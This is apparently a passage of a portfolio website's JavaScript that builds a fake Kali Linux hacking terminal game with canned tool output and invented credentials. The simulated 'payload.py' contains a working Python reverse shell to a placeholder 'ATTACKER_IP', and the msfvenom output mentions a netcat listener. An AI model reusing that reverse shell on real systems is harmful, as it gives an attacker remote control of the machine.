// ============ KALI LINUX HACKING SIMULATION TERMINAL ============
(function() {
    'use strict';

    const hackingGame = document.getElementById('hacking-game');
    const openGame = document.getElementById('open-game');
    const closeGame = document.getElementById('close-game');
    const terminalInput = document.getElementById('terminal-input');
    const terminalOutput = document.getElementById('terminal-output');

    if (!hackingGame || !terminalInput || !terminalOutput) return;

    let gameProgress = 0;
    const targetIP = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
    const macAddr = 'AA:BB:CC:' + Math.floor(Math.random()*99).toString().padStart(2,'0') + ':' + Math.floor(Math.random()*99).toString().padStart(2,'0') + ':' + Math.floor(Math.random()*99).toString().padStart(2,'0');
    let currentDir = '/root';
    let sshConnected = false;
    let capturedHandshake = false;
    let sqlTarget = false;
    let commandHistory = [];

    // Helper to build colored spans without raw HTML in template literals
    function clr(color, text) { return '<span class="text-' + color + '-400">' + text + '</span>'; }

    // Simulated file system
    const fileSystem = {
        '/root': ['Desktop', 'Documents', 'Downloads', 'tools', '.bashrc', '.ssh', 'targets.txt', 'payload.py', 'wordlist.txt'],
        '/root/Desktop': ['notes.txt', 'exploits/'],
        '/root/Documents': ['report.pdf', 'creds.txt', 'network_map.png'],
        '/root/Downloads': ['rockyou.txt', 'linpeas.sh', 'pspy64'],
        '/root/tools': ['scanner.py', 'brute.sh', 'enum.py', 'c2_server.py'],
        '/root/.ssh': ['id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys'],
        '/etc': ['passwd', 'shadow', 'hosts', 'resolv.conf', 'ssh/', 'nginx/'],
        '/var/log': ['auth.log', 'syslog', 'apache2/', 'kern.log'],
        '/tmp': ['.hidden_backdoor', 'session_data', 'exploit.elf'],
    };

    // Simulated file contents
    const fileContents = {
        'targets.txt': '# Target List \u2014 Grok Galaxy Op\n' + targetIP + '  \u2014 Web Server (Apache 2.4)\n10.10.14.22  \u2014 Database Server (MySQL)\n10.10.14.55  \u2014 Domain Controller (AD)\n172.16.0.1   \u2014 Gateway Router',
        'payload.py': '#!/usr/bin/env python3\n# Reverse Shell Payload\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("ATTACKER_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])',
        '.bashrc': '# ~/.bashrc\nexport PS1=\'\\[\\e[31m\\]root@kali\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]# \'\nalias ll=\'ls -la\'\nalias nse=\'ls /usr/share/nmap/scripts/\'\nalias serve=\'python3 -m http.server 8080\'\nexport PATH=$PATH:/opt/tools',
        'creds.txt': '[CAPTURED CREDENTIALS]\nadmin:P@ssw0rd123!\nroot:toor\nuser:Welcome1\ndb_admin:MySQL_S3cure!\nbackup:Backup2025!',
        'notes.txt': '[PENTEST NOTES]\n- Target scoped: ' + targetIP + '\n- Initial foothold via weak SSH creds\n- Priv esc: SUID binary /usr/bin/find\n- Lateral movement: Pass-the-Hash\n- Flag location: /root/flag.txt',
        '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nshankar:x:1000:1000:Shankar Adhikary:/home/shankar:/bin/bash\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false',
        '/etc/shadow': '[ACCESS DENIED] Permission denied. Try \'sudo cat /etc/shadow\'',
        '/etc/hosts': '127.0.0.1\tlocalhost\n' + targetIP + '\ttarget.grokgalaxy.local\n10.10.14.22\tdb.grokgalaxy.local\n10.10.14.55\tdc.grokgalaxy.local',
        'wordlist.txt': 'password\n123456\nadmin\nletmein\nwelcome\nmonkey\nmaster\ndragon\nqwerty\nP@ssw0rd\n... (14,344,391 more lines)',
    };

    const hackingCommands = {
        help: function() {
            return clr('green', '\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557') + '\n' +
                clr('green', '\u2551          KALI LINUX TERMINAL \u2014 COMMAND LIST       \u2551') + '\n' +
                clr('green', '\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d') + '\n\n' +
                clr('yellow', '\u2500\u2500 MISSION COMMANDS \u2500\u2500') + '\n' +
                '  scan       Scan target network (nmap simulation)\n' +
                '  hack       Exploit target system\n' +
                '  decrypt    Decrypt captured data\n\n' +
                clr('yellow', '\u2500\u2500 INFORMATION GATHERING \u2500\u2500') + '\n' +
                '  nmap       Network mapper / port scanner\n' +
                '  whois      Domain/IP WHOIS lookup\n' +
                '  dig        DNS lookup utility\n' +
                '  ping       Send ICMP echo requests\n' +
                '  traceroute Trace packet route to target\n' +
                '  netdiscover ARP reconnaissance\n' +
                '  theharvester Email & subdomain harvester\n' +
                '  recon-ng   Reconnaissance framework\n' +
                '  dmitry     Deepmagic Information Tool\n\n' +
                clr('yellow', '\u2500\u2500 VULNERABILITY ANALYSIS \u2500\u2500') + '\n' +
                '  nikto      Web server vulnerability scanner\n' +
                '  wpscan     WordPress scanner\n' +
                '  sqlmap     SQL injection automation\n' +
                '  searchsploit Search for exploits (Exploit-DB)\n' +
                '  gobuster   Directory/file brute-forcer\n' +
                '  dirb       Web content scanner\n' +
                '  enum4linux SMB enumeration tool\n\n' +
                clr('yellow', '\u2500\u2500 EXPLOITATION \u2500\u2500') + '\n' +
                '  msfconsole Metasploit Framework console\n' +
                '  msfvenom   Payload generator\n' +
                '  hydra      Login brute-force tool\n' +
                '  john       John the Ripper (password cracker)\n' +
                '  hashcat    Advanced password recovery\n' +
                '  burpsuite  Web app security testing\n' +
                '  setoolkit  Social Engineering Toolkit\n' +
                '  beef       Browser Exploitation Framework\n\n' +
                clr('yellow', '\u2500\u2500 WIRELESS ATTACKS \u2500\u2500') + '\n' +
                '  airmon-ng  Enable monitor mode\n' +
                '  airodump-ng Capture wireless packets\n' +
                '  aircrack-ng Crack WPA/WPA2 keys\n' +
                '  wifite     Automated wireless auditor\n\n' +
                clr('yellow', '\u2500\u2500 SNIFFING & SPOOFING \u2500\u2500') + '\n' +
                '  wireshark  Network protocol analyzer\n' +
                '  tcpdump    Command-line packet analyzer\n' +
                '  ettercap   Man-in-the-middle attacks\n' +
                '  arpspoof   ARP spoofing tool\n' +
                '  responder  LLMNR/NBT-NS/MDNS poisoner\n\n' +
                clr('yellow', '\u2500\u2500 POST-EXPLOITATION \u2500\u2500') + '\n' +
                '  netcat     Network Swiss Army Knife (nc)\n' +
                '  linpeas    Linux privilege escalation\n' +
                '  winpeas    Windows privilege escalation\n' +
                '  mimikatz   Credential extraction (Windows)\n' +
                '  bloodhound AD attack path mapping\n\n' +
                clr('yellow', '\u2500\u2500 SYSTEM COMMANDS \u2500\u2500') + '\n' +
                '  ls         List directory contents\n' +
                '  cd         Change directory\n' +
                '  cat        Display file contents\n' +
                '  pwd        Print working directory\n' +
                '  id         Display user/group info\n' +
                '  uname      System information\n' +
                '  ifconfig   Network interface config\n' +
                '  ps         Running processes\n' +
                '  history    Command history\n' +
                '  neofetch   System info display\n' +
                '  date       Show date/time\n' +
                '  uptime     System uptime\n' +
                '  df         Disk usage\n\n' +
                clr('yellow', '\u2500\u2500 PORTFOLIO \u2500\u2500') + '\n' +
                '  whoami     Display current user info\n' +
                '  skills     Show Shankar\'s skills\n' +
                '  contact    Display contact info\n' +
                '  certs      Show certifications\n' +
                '  projects   Show projects\n' +
                '  about      About Shankar\n' +
                '  socials    Social media links\n\n' +
                clr('yellow', '\u2500\u2500 UTILITIES \u2500\u2500') + '\n' +
                '  clear      Clear terminal\n' +
                '  reset      Reset simulation\n' +
                '  banner     Show ASCII banner\n' +
                '  matrix     Matrix rain effect\n' +
                '  exit       Exit terminal';
        },

        // =============== INFORMATION GATHERING ===============
        nmap: function() {
            gameProgress = Math.max(gameProgress, 1);
            return clr('cyan', 'Starting Nmap 7.94SVN ( https://nmap.org )') + '\n' +
                'Nmap scan report for ' + targetIP + '\n' +
                'Host is up (0.023s latency).\n' +
                'Not shown: 993 closed tcp ports\n\n' +
                'PORT      STATE  SERVICE       VERSION\n' +
                clr('green', '22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu') + '\n' +
                clr('green', '53/tcp    open   domain        ISC BIND 9.18.12') + '\n' +
                clr('green', '80/tcp    open   http          Apache httpd 2.4.52') + '\n' +
                clr('yellow', '139/tcp   open   netbios-ssn   Samba smbd 4.15') + '\n' +
                clr('yellow', '443/tcp   open   ssl/https     Apache httpd 2.4.52') + '\n' +
                clr('yellow', '445/tcp   open   microsoft-ds  Samba smbd 4.15') + '\n' +
                clr('red', '3306/tcp  open   mysql         MySQL 8.0.32') + '\n' +
                clr('red', '8080/tcp  open   http-proxy    Squid 5.2') + '\n\n' +
                'MAC Address: ' + macAddr + ' (VMware)\n' +
                'OS: Ubuntu 22.04 LTS (Linux 5.15)\n' +
                'Aggressive OS guesses: Linux 5.x (97%)\n\n' +
                clr('green', 'Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds') + '\n' +
                '[*] Multiple attack vectors found. Try \'nikto\', \'gobuster\', or \'sqlmap\'.';
        },

        scan: function() {
            gameProgress = Math.max(gameProgress, 1);
            return '[SCANNING] Network scan initiated...\n' +
                '[+] Found target: ' + targetIP + '\n' +
                '[+] Port 22 (SSH) - OPEN\n' +
                '[+] Port 80 (HTTP) - OPEN\n' +
                '[+] Port 443 (HTTPS) - OPEN\n' +
                '[+] Port 3306 (MySQL) - OPEN\n' +
                '[!] Vulnerability detected: Weak authentication\n' +
                '[*] Ready to hack. Type \'hack\' to proceed or use \'nmap\' for detailed scan.';
        },

        whois: function() {
            return clr('cyan', '[WHOIS] Querying ' + targetIP + '...') + '\n\n' +
                'NetRange:       192.168.0.0 - 192.168.255.255\n' +
                'CIDR:           192.168.0.0/16\n' +
                'NetName:        PRIVATE-ADDRESS-CBLK\n' +
                'Organization:   Grok Galaxy Corp (GROK-13)\n' +
                'RegDate:        2024-01-15\n' +
                'Updated:        2025-12-01\n' +
                'Country:        IN\n' +
                'City:           Gandhinagar, Gujarat\n\n' +
                'AdminHandle:    SA2006-ARIN\n' +
                'AdminName:      Shankar Adhikary\n' +
                'AdminEmail:     adhikaryshankar04@gmail.com\n\n' +
                clr('yellow', '[*] Target appears to be on a private network.');
        },

        dig: function() {
            return clr('cyan', '; <<>> DiG 9.18.12 <<>> target.grokgalaxy.local') + '\n' +
                ';; ANSWER SECTION:\n' +
                'target.grokgalaxy.local.  300  IN  A     ' + targetIP + '\n' +
                'target.grokgalaxy.local.  300  IN  MX    10 mail.grokgalaxy.local.\n' +
                'target.grokgalaxy.local.  300  IN  NS    ns1.grokgalaxy.local.\n' +
                'target.grokgalaxy.local.  300  IN  TXT   "v=spf1 include:grokgalaxy.local ~all"\n\n' +
                ';; ADDITIONAL SECTION:\n' +
                'db.grokgalaxy.local.      300  IN  A     10.10.14.22\n' +
                'dc.grokgalaxy.local.      300  IN  A     10.10.14.55\n\n' +
                ';; Query time: 12 msec\n' +
                ';; SERVER: ' + targetIP + '#53\n' +
                ';; MSG SIZE  rcvd: 245';
        },

        ping: function() {
            return 'PING ' + targetIP + ' (' + targetIP + ') 56(84) bytes of data.\n' +
                '64 bytes from ' + targetIP + ': icmp_seq=1 ttl=64 time=0.023 ms\n' +
                '64 bytes from ' + targetIP + ': icmp_seq=2 ttl=64 time=0.019 ms\n' +
                '64 bytes from ' + targetIP + ': icmp_seq=3 ttl=64 time=0.021 ms\n' +
                '64 bytes from ' + targetIP + ': icmp_seq=4 ttl=64 time=0.018 ms\n\n' +
                '--- ' + targetIP + ' ping statistics ---\n' +
                '4 packets transmitted, 4 received, ' + clr('green', '0% packet loss') + ', time 3004ms\n' +
                'rtt min/avg/max/mdev = 0.018/0.020/0.023/0.002 ms';
        },

        traceroute: function() {
            return clr('cyan', 'traceroute to ' + targetIP + ', 30 hops max, 60 byte packets') + '\n' +
                ' 1  gateway (10.0.2.1)  0.321 ms  0.289 ms  0.265 ms\n' +
                ' 2  172.16.0.1          1.234 ms  1.198 ms  1.156 ms\n' +
                ' 3  10.10.14.1          2.456 ms  2.412 ms  2.389 ms\n' +
                ' 4  ' + targetIP + '         3.012 ms  2.998 ms  2.967 ms\n\n' +
                clr('green', '[*] Target reached in 4 hops.');
        },

        netdiscover: function() {
            var subnet = targetIP.split('.').slice(0,3).join('.');
            return clr('cyan', 'Currently scanning: ' + subnet + '.0/24') + '\n\n' +
                ' IP              MAC Address       Hostname\n' +
                ' \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n' +
                ' ' + subnet + '.1       AA:BB:CC:00:00:01  gateway.local\n' +
                ' ' + targetIP + '     ' + macAddr + '  target.grokgalaxy.local\n' +
                ' ' + subnet + '.22      AA:BB:CC:00:00:22  db.grokgalaxy.local\n' +
                ' ' + subnet + '.55      AA:BB:CC:00:00:55  dc.grokgalaxy.local\n' +
                ' ' + subnet + '.100     AA:BB:CC:00:01:00  workstation-01\n\n' +
                clr('green', '[*] 5 hosts discovered on the network.');
        },

        theharvester: function() {
            return clr('cyan', '[*] theHarvester \u2014 Email & subdomain harvester') + '\n' +
                '[*] Target domain: grokgalaxy.local\n' +
                '[*] Searching: Google, Bing, LinkedIn, GitHub...\n\n' +
                clr('green', '[+] Emails found:') + '\n' +
                '  adhikaryshankar04@gmail.com\n' +
                '  admin@grokgalaxy.local\n' +
                '  info@grokgalaxy.local\n\n' +
                clr('green', '[+] Subdomains found:') + '\n' +
                '  mail.grokgalaxy.local\n' +
                '  vpn.grokgalaxy.local\n' +
                '  dev.grokgalaxy.local\n' +
                '  api.grokgalaxy.local\n' +
                '  staging.grokgalaxy.local\n\n' +
                clr('green', '[+] LinkedIn profiles:') + '\n' +
                '  Shankar Adhikary \u2014 Cybersecurity @ RRU\n\n' +
                '[*] Harvesting complete. 3 emails, 5 subdomains found.';
        },

        'recon-ng': function() {
            return clr('cyan', '[recon-ng][default] >') + ' Recon-NG Framework v5.1.2\n' +
                '[*] Loaded 85 modules\n' +
                '[*] Available reconnaissance modules:\n' +
                '  recon/domains-hosts/hackertarget\n' +
                '  recon/domains-contacts/whois_pocs\n' +
                '  recon/hosts-ports/shodan_ip\n' +
                '  recon/netblocks-hosts/reverse_resolve\n' +
                '  discovery/info_disclosure/cache_snoop\n\n' +
                clr('yellow', '[*] Use \'nmap\' or \'theharvester\' for quick recon in this simulation.');
        },

        dmitry: function() {
            return clr('cyan', 'Deepmagic Information Gathering Tool v1.3a') + '\n' +
                'Target: ' + targetIP + '\n\n' +
                '[*] Performing TCP port scan...\n' +
                '[*] Checking for subdomains...\n' +
                '[*] Gathering email addresses...\n\n' +
                'HostIP: ' + targetIP + '\n' +
                'HostName: target.grokgalaxy.local\n' +
                'Registrar: Grok Galaxy Corp\n' +
                'Uptime: 142 days\n\n' +
                clr('green', '[*] All results saved to /root/dmitry_output.txt');
        },

        // =============== VULNERABILITY ANALYSIS ===============
        nikto: function() {
            return clr('cyan', '- Nikto v2.5.0') + '\n' +
                '---------------------------------------------------------------------------\n' +
                '+ Target IP:          ' + targetIP + '\n' +
                '+ Target Hostname:    target.grokgalaxy.local\n' +
                '+ Target Port:        80\n' +
                '+ Start Time:         ' + new Date().toISOString() + '\n' +
                '---------------------------------------------------------------------------\n' +
                '+ Server: Apache/2.4.52 (Ubuntu)\n' +
                clr('red', '+ /admin/: Directory indexing found') + '\n' +
                clr('red', '+ /phpMyAdmin/: phpMyAdmin 5.1.1 found') + '\n' +
                clr('red', '+ /backup/: Backup directory accessible') + '\n' +
                clr('yellow', '+ /robots.txt: Contains 5 disallowed entries') + '\n' +
                clr('yellow', '+ Apache/2.4.52 appears to be outdated (current: 2.4.58)') + '\n' +
                clr('red', '+ OSVDB-3092: /.env file found \u2014 may contain credentials!') + '\n' +
                clr('red', '+ X-Frame-Options header missing \u2014 clickjacking risk') + '\n' +
                clr('yellow', '+ Server leaks inode via ETags') + '\n' +
                '+ 7 vulnerabilities found. Run \'sqlmap\' or \'gobuster\' for deeper analysis.\n' +
                '---------------------------------------------------------------------------';
        },

        wpscan: function() {
            return clr('cyan', '_______________________________________________\n' +
                '        __          _______   _____\n' +
                '        \\\\ \\\\        / /  __ \\\\ / ____|\n' +
                '         \\\\ \\\\  /\\\\  / /| |__) | (___   ___ __ _ _ __\n' +
                '          \\\\ \\\\/  \\\\/ / |  ___/ \\\\___ \\\\ / __/ _` | \'_ \\\\\n' +
                '           \\\\  /\\\\  /  | |     ____) | (_| (_| | | | |\n' +
                '            \\\\/  \\\\/   |_|    |_____/ \\\\___\\\\__,_|_| |_|\n' +
                '        WordPress Security Scanner') + '\n\n' +
                '[+] URL: http://' + targetIP + '/\n' +
                '[+] WordPress version: 6.4.1 (outdated)\n' +
                clr('red', '[!] 3 vulnerabilities found for this version') + '\n' +
                '[+] Theme: galaxy-theme v1.2\n' +
                clr('yellow', '[!] Outdated theme detected') + '\n' +
                '[+] Plugins found:\n' +
                '  ' + clr('red', '[!] contact-form-7 v5.7 \u2014 SQL Injection (CVE-2023-XXXX)') + '\n' +
                '  ' + clr('yellow', '[i] akismet v5.3 \u2014 No known vulnerabilities') + '\n' +
                '  ' + clr('red', '[!] wp-file-manager v6.8 \u2014 RCE (CVE-2020-25213)') + '\n\n' +
                '[+] Users enumerated:\n' +
                '  [1] admin\n' +
                '  [2] shankar\n\n' +
                clr('green', '[*] Try \'hydra\' to brute-force login credentials.');
        },

        sqlmap: function() {
            sqlTarget = true;
            return clr('cyan', '[*] sqlmap v1.7.12 \u2014 automatic SQL injection tool') + '\n' +
                '[*] Target URL: http://' + targetIP + '/login.php?id=1\n' +
                '[*] Testing connection...\n\n' +
                clr('green', '[*] Parameter \'id\' is vulnerable to SQL injection!') + '\n' +
                '[*] Type: boolean-based blind\n' +
                '[*] Type: time-based blind\n' +
                '[*] Type: UNION query\n\n' +
                '[*] Fetching database names...\n' +
                clr('green', '[+] Database: grokgalaxy_db') + '\n' +
                clr('green', '[+] Database: information_schema') + '\n' +
                clr('green', '[+] Database: mysql') + '\n\n' +
                '[*] Fetching tables from grokgalaxy_db...\n' +
                '  +\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500+\n' +
                '  | users        |\n' +
                '  | credentials  |\n' +
                '  | sessions     |\n' +
                '  | admin_panel  |\n' +
                '  | secrets      |\n' +
                '  +\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500+\n\n' +
                clr('red', '[+] Dumped 5 tables. Credentials extracted!') + '\n' +
                '[*] admin:P@ssw0rd123! | root:toor | shankar:GrokGalaxy2025!';
        },

        searchsploit: function() {
            return clr('cyan', '[*] searchsploit \u2014 Exploit Database Search') + '\n' +
                'Searching for: Apache 2.4.52, OpenSSH 8.9, MySQL 8.0, Samba 4.15\n\n' +
                ' Exploit Title                                    | Path\n' +
                ' \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500+\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n' +
                ' Apache 2.4.49-50 - Path Traversal & RCE          | exploits/linux/50383.sh\n' +
                ' OpenSSH 8.x - Username Enumeration               | exploits/linux/45939.py\n' +
                ' MySQL 8.0 - Privilege Escalation                  | exploits/linux/51026.py\n' +
                ' Samba 4.x - Remote Code Execution                 | exploits/linux/42084.rb\n' +
                ' Apache mod_proxy - SSRF (CVE-2021-40438)          | exploits/linux/50569.py\n\n' +
                clr('green', '[*] 5 potential exploits found. Use \'msfconsole\' to weaponize.');
        },

        gobuster: function() {
            return clr('cyan', '===============================================================\nGobuster v3.6 \u2014 Directory/File Brute-Forcer\n===============================================================') + '\n' +
                '[*] Url:            http://' + targetIP + '\n' +
                '[*] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n' +
                '[*] Status codes:   200,204,301,302,307,401,403\n\n' +
                clr('green', '/index.html          (Status: 200) [Size: 14521]') + '\n' +
                clr('green', '/admin               (Status: 301) [Size: 312]') + '\n' +
                clr('red', '/backup              (Status: 200) [Size: 48293]') + '\n' +
                clr('green', '/api                 (Status: 200) [Size: 287]') + '\n' +
                clr('yellow', '/login               (Status: 200) [Size: 3421]') + '\n' +
                clr('red', '/phpMyAdmin          (Status: 200) [Size: 12845]') + '\n' +
                clr('red', '/.env                (Status: 200) [Size: 512]') + '\n' +
                clr('yellow', '/uploads             (Status: 301) [Size: 316]') + '\n' +
                clr('green', '/robots.txt          (Status: 200) [Size: 142]') + '\n' +
                clr('red', '/config.bak          (Status: 200) [Size: 2048]') + '\n\n' +
                clr('green', '===============================================================\n[*] Finished \u2014 10 directories found.');
        },

        dirb: function() {
            return clr('cyan', '-----------------\nDIRB v2.22\n-----------------') + '\n' +
                'URL_BASE: http://' + targetIP + '/\n' +
                'WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n' +
                '---- Scanning URL: http://' + targetIP + '/ ----\n' +
                clr('green', '+ http://' + targetIP + '/admin (CODE:301|SIZE:312)') + '\n' +
                clr('green', '+ http://' + targetIP + '/api (CODE:200|SIZE:287)') + '\n' +
                clr('green', '+ http://' + targetIP + '/backup (CODE:200|SIZE:48293)') + '\n' +
                clr('green', '+ http://' + targetIP + '/index.html (CODE:200|SIZE:14521)') + '\n\n' +
                clr('green', '---- Results: 4 directories found ----') + '\n' +
                '[*] Similar to \'gobuster\'. Try both for comprehensive coverage.';
        },

        enum4linux: function() {
            return clr('cyan', 'enum4linux v0.9.1 \u2014 SMB Enumeration Tool') + '\n' +
                'Target: ' + targetIP + '\n\n' +
                '[+] Server ' + targetIP + ' allows sessions using username \'\', password \'\'\n' +
                '[+] OS: Ubuntu 22.04 LTS\n\n' +
                clr('green', '[+] Share Enumeration:') + '\n' +
                '  //target/public       Mapping: OK Access: READ\n' +
                '  //target/admin$       Mapping: DENIED\n' +
                '  //target/backups      Mapping: OK Access: READ/WRITE\n' +
                '  //target/IPC$         Mapping: OK Access: READ\n\n' +
                clr('green', '[+] Users via RID cycling:') + '\n' +
                '  S-1-5-21-...-500  Administrator\n' +
                '  S-1-5-21-...-1000 shankar\n' +
                '  S-1-5-21-...-1001 admin\n\n' +
                clr('yellow', '[*] Writable share \'backups\' found \u2014 potential data exfil point!');
        },

        // =============== EXPLOITATION ===============
        msfconsole: function() {
            return clr('cyan', '                                   ____________\n' +
                ' [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a]        [/teletubbies]\n' +
                ' [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $move_on]  [/kill]\n' +
                ' [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $b]        [/sleep]\n' +
                ' [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| msf]       [/coffee]\n\n' +
                '       =[ metasploit v6.3.44-dev ]\n' +
                '+ -- --=[ 2368 exploits - 1232 auxiliary ]\n' +
                '+ -- --=[ 1389 payloads - 46 encoders ]\n' +
                '+ -- --=[ 11 nops - 9 evasion ]') + '\n\n' +
                clr('red', 'msf6 >') + ' Available simulation modules:\n' +
                '  exploit/multi/handler         \u2014 Generic payload handler\n' +
                '  exploit/unix/ftp/vsftpd_234   \u2014 vsFTPd 2.3.4 Backdoor\n' +
                '  exploit/linux/samba/is_known  \u2014 Samba pipe exploit\n' +
                '  auxiliary/scanner/ssh/ssh_login \u2014 SSH Brute Force\n\n' +
                clr('yellow', '[*] Use \'hydra\' for brute-force or \'hack\' to auto-exploit.');
        },

        msfvenom: function() {
            return clr('cyan', '[*] msfvenom \u2014 Payload Generator') + '\n\n' +
                'Generated payloads:\n' +
                clr('green', '[+] linux/x64/meterpreter/reverse_tcp') + '\n' +
                '    LHOST=10.10.14.2 LPORT=4444\n' +
                '    Format: elf\n' +
                '    Size: 250 bytes\n' +
                '    Saved: /root/payload.elf\n\n' +
                clr('green', '[+] windows/x64/meterpreter/reverse_tcp') + '\n' +
                '    LHOST=10.10.14.2 LPORT=4445\n' +
                '    Format: exe\n' +
                '    Size: 7168 bytes\n' +
                '    Saved: /root/payload.exe\n\n' +
                clr('green', '[+] php/meterpreter/reverse_tcp') + '\n' +
                '    LHOST=10.10.14.2 LPORT=4446\n' +
                '    Format: raw\n' +
                '    Size: 1116 bytes\n' +
                '    Saved: /root/shell.php\n\n' +
                clr('yellow', '[*] Use \'netcat\' or \'nc -lvnp 4444\' to catch the reverse shell.');
        },

        hydra: function() {
            return clr('cyan', 'Hydra v9.5 \u2014 Network Logon Cracker') + '\n' +
                '[DATA] attacking ssh://' + targetIP + ':22\n' +
                '[DATA] Wordlist: /usr/share/wordlists/rockyou.txt\n\n' +
                '[ATTEMPT] target ' + targetIP + ' - login "admin" - pass "password" - 1 of 14344391\n' +
                '[ATTEMPT] target ' + targetIP + ' - login "admin" - pass "123456" - 2 of 14344391\n' +
                '[ATTEMPT] target ' + targetIP + ' - login "admin" - pass "admin" - 3 of 14344391\n' +
                '...\n' +
                clr('green', '[22][ssh] host: ' + targetIP + '   login: admin   password: P@ssw0rd123!') + '\n' +
                clr('green', '[22][ssh] host: ' + targetIP + '   login: root    password: toor') + '\n\n' +
                clr('green', '[*] 2 valid passwords found!') + '\n' +
                '[*] Try \'ssh\' to connect with these credentials.';
        },

        john: function() {
            return clr('cyan', 'John the Ripper 1.9.0-jumbo-1') + '\n' +
                'Loaded 5 password hashes (sha512crypt)\n\n' +
                clr('green', 'P@ssw0rd123!     (admin)') + '\n' +
                clr('green', 'toor             (root)') + '\n' +
                clr('green', 'Welcome1         (user)') + '\n' +
                clr('green', 'MySQL_S3cure!    (db_admin)') + '\n\n' +
                '4g 0:00:03:42 DONE (' + new Date().toLocaleTimeString() + ')\n' +
                'Session completed. 4/5 hashes cracked.\n' +
                'Use --show to display all results.';
        },

        hashcat: function() {
            return clr('cyan', 'hashcat v6.2.6 \u2014 Advanced Password Recovery') + '\n' +
                'Session: grokgalaxy\n' +
                'Hash Mode: 1800 (sha512crypt $6$)\n' +
                'Device #1: NVIDIA RTX 4090 (16384 MB)\n\n' +
                'Speed.#1: 512.0 kH/s (Optimized)\n\n' +
                '$6$rounds=5000$salt$hash...:P@ssw0rd123!\n' +
                '$6$rounds=5000$salt$hash...:toor\n' +
                '$6$rounds=5000$salt$hash...:Welcome1\n\n' +
                clr('green', 'Status: Cracked (3/5)') + '\n' +
                'Runtime: 2 mins 15 secs\n' +
                'Candidates: P@ssw0rd123! -> Welcome1';
        },

        burpsuite: function() {
            return clr('cyan', 'Burp Suite Professional v2024.1') + '\n\n' +
                '[Proxy]     Intercepting traffic on 127.0.0.1:8080\n' +
                '[Scanner]   Active scan on http://' + targetIP + '\n' +
                '[Intruder]  Ready for payload injection\n' +
                '[Repeater]  Request queue: 0\n\n' +
                clr('red', '[VULN] SQL Injection in /login.php (parameter: id)') + '\n' +
                clr('red', '[VULN] XSS Reflected in /search.php (parameter: q)') + '\n' +
                clr('yellow', '[INFO] Session cookie without HttpOnly flag') + '\n' +
                clr('yellow', '[INFO] Missing Content-Security-Policy header') + '\n\n' +
                clr('green', '[*] 2 high, 2 medium vulnerabilities found.') + '\n' +
                '[*] Use \'sqlmap\' for automated SQL injection exploitation.';
        },

        setoolkit: function() {
            return clr('cyan', ' _____ _____ _____\n' +
                '|   __|   __|_   _|  Social Engineering Toolkit v8.0.3\n' +
                '|__   |   __| | |    Coded by: TrustedSec\n' +
                '|_____|_____| |_|    https://trustedsec.com') + '\n\n' +
                'Select an attack vector:\n' +
                '  1) Spear-Phishing Attack\n' +
                '  2) Website Attack Vectors\n' +
                '  3) Infectious Media Generator\n' +
                '  4) Create a Payload and Listener\n' +
                '  5) SMS Spoofing Attack\n\n' +
                clr('yellow', '[*] This is a simulation. In real pentests, always have written authorization!') + '\n' +
                clr('yellow', '[*] Social engineering is the #1 attack vector \u2014 humans are the weakest link.');
        },

        beef: function() {
            return clr('cyan', '[*] BeEF \u2014 Browser Exploitation Framework v0.5.4.0') + '\n\n' +
                '[+] Web UI: http://127.0.0.1:3000/ui/panel\n' +
